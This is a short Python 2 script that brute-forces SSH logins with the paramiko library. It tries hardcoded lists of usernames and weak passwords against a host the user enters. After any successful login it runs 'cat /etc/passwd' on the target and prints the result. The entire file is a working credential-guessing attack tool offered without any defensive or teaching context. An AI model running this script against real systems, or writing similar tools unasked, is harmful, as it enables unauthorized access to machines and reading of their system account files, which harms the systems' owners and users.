#!/usr/bin/python

# importing modules
import paramiko
import sys
import time

# globals
__USERNAME__ = ['andrew', 'bruce', 'jon', 'kevin']
__PASSWORD__ = ['lebron23', 'kobe24', 'jordan23', 'iverson3', 'jordan45']

# function definition
def main(host):
    ssh_instance = ssh_client_setup()
    bruteforce(ssh_instance, host)
    ssh_instance.close()

def ssh_client_setup():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("paramiko.log")

    return ssh

def bruteforce(ssh, host):
    global __USERNAME__
    global __PASSWORD__

    for uname in __USERNAME__:
        for pword in __PASSWORD__:
            try: 
                print '[+] Trying to login using username: %s and password = %s' %(uname, pword)
                ssh.connect(host, username=uname, password=pword, banner_timeout=60, auth_timeout=60)

            except:         # sys.exc_info() returns a tuple about the exception, and element 1 is the value of it
                print '[-] %s while trying username: %s, and password: %s' %(sys.exc_info()[1], uname, pword)
    
            else:
                print '[+] Successfully logged in using username: %s, and password: %s' %(uname, pword)
                stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')      # the command could technically be an input from cmdline
                
                for line in stdout.readlines():
                    print line.strip()
                break

# script execution
if __name__ == '__main__':
    hostname_ip = raw_input('[+] Hostname/IP: ')
    main(hostname_ip)
    sys.exit(0)

